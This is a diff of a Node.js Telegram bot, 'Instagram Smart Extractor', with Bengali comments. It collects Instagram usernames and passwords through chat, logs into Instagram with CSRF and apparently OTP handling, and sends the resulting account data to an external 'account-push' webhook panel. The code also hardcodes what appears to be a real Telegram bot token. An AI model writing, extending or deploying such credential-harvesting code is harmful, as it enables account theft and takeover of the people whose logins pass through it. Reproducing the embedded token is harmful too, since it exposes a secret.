@@ -1,3 +1,4 @@
+// ১. প্রয়োজনীয় লাইব্রেরি ইমপোর্ট
 const TelegramBot = require('node-telegram-bot-api');
 const axios = require('axios');
 const { wrapper } = require('axios-cookiejar-support');
@@ -5,35 +6,41 @@ const { CookieJar } = require('tough-cookie');
 const { authenticator } = require('otplib');
 const http = require('http');
 
-// --- Render Port Binding (এটি না থাকলে Render অ্যাপ বন্ধ করে দেয়) ---
+console.log("Starting Bot Deployment Process...");
+
+// ২. Render-এর জন্য পোর্ট বাইন্ডিং (এটি না থাকলে Render অ্যাপ বন্ধ করে দেয়)
 const PORT = process.env.PORT || 3000;
 http.createServer((req, res) => {
-  res.writeHead(200, {'Content-Type': 'text/plain'});
-  res.write("Bot is running perfectly!");
-  res.end();
+  res.writeHead(200, { 'Content-Type': 'text/plain' });
+  res.end('Instagram Bot is Active\n');
 }).listen(PORT, () => {
-  console.log(`Server is listening on port ${PORT}`);
+  console.log(`Web server is listening on port ${PORT}`);
 });
 
-// --- কনফিগারেশন (সতর্কতা: টোকেন ঠিকভাবে বসান) ---
-const TOKEN = '7142079092:AAGHKZJ1K6BRQ7CckbNWeYyXmW05xGZ4FT8'; // এখানে আপনার আসল টোকেন দিন
+// ৩. কনফিগারেশন
+// আপনার বট টোকেন এখানে দিন। টোকেন না দিলে কোড কাজ করবে না।
+const TOKEN = '7142079092:AAGHKZJ1K6BRQ7CckbNWeYyXmW05xGZ4FT8'; 
 const WEBHOOK_URL = "https://ins.skysysx.com/api/api/v1/webhook/FlxhUHdINnPQxsBhqqpNw4L4nn_1ICQyCKKXoGBETCg/account-push";
 
-// বট চালু করার চেষ্টা
-let bot;
-try {
-    bot = new TelegramBot(TOKEN, { polling: true });
-    console.log("Telegram Bot initialized successfully.");
-} catch (error) {
-    console.error("Failed to initialize Bot:", error.message);
-    process.exit(1); // ভুল টোকেন হলে কোড বন্ধ হয়ে যাবে
+// টোকেন চেক
+if (!TOKEN || TOKEN === 'YOUR_TELEGRAM_BOT_TOKEN') {
+    console.error("ERROR: আপনার টেলিগ্রাম বট টোকেন সেট করা হয়নি!");
+    process.exit(1); 
 }
 
+const bot = new TelegramBot(TOKEN, { polling: true });
 const userStates = {};
 
+bot.on('polling_error', (error) => {
+    console.error("Telegram Polling Error:", error.message);
+});
+
+console.log("Bot is successfully connected to Telegram.");
+
 bot.onText(/\/start/, (msg) => {
-    bot.sendMessage(msg.chat.id, "🤖 **Instagram Smart Extractor**\n\n👤 ইউজারনেম দিন:");
-    userStates[msg.chat.id] = { step: 'username' };
+    const chatId = msg.chat.id;
+    bot.sendMessage(chatId, "🤖 **Instagram Smart Extractor**\n\n👤 ইউজারনেম (Username) দিন:");
+    userStates[chatId] = { step: 'username' };
 });
 
 bot.on('message', async (msg) => {
@@ -46,7 +53,7 @@ bot.on('message', async (msg) => {
     if (state.step === 'username') {
         state.username = text.trim();
         state.step = 'password';
-        bot.sendMessage(chatId, "🔑 পাসওয়ার্ড দিন:");
+        bot.sendMessage(chatId, "🔑 পাসওয়ার্ড (Password) দিন:");
     } 
     else if (state.step === 'password') {
         state.password = text.trim();
@@ -71,8 +78,7 @@ async function processLogin(chatId) {
         const csrf = cookies.find(c => c.key === 'csrftoken')?.value;
 
         if (!csrf) {
-            bot.sendMessage(chatId, "❌ CSRF Token পাওয়া যায়নি। আইপি ব্লক হতে পারে।");
-            return;
+            return bot.sendMessage(chatId, "❌ এরর: CSRF টোকেন পাওয়া যায়নি। আইপি ব্লক হতে পারে।");
         }
 
         const headers = {
@@ -117,9 +123,9 @@ async function processLogin(chatId) {
                 headers: { 'Content-Type': 'text/plain' }
             });
 
-            bot.sendMessage(chatId, `✅ সফল!\n\n🚀 প্যানেল রেসপন্স: ${JSON.stringify(pushRes.data)}`);
+            bot.sendMessage(chatId, `🎉 **সফল!**\n\n📊 প্যানেল রেসপন্স: ${JSON.stringify(pushRes.data)}`);
         } else {
-            bot.sendMessage(chatId, `❌ ব্যর্থ: ${loginRes.data.message || "আইডি/পাসওয়ার্ড ভুল"}`);
+            bot.sendMessage(chatId, `❌ ব্যর্থ: ${loginRes.data.message || "পাসওয়ার্ড ভুল বা আইপি সমস্যা"}`);
         }
     } catch (err) {
         bot.sendMessage(chatId, `❌ এরর: ${err.message}`);
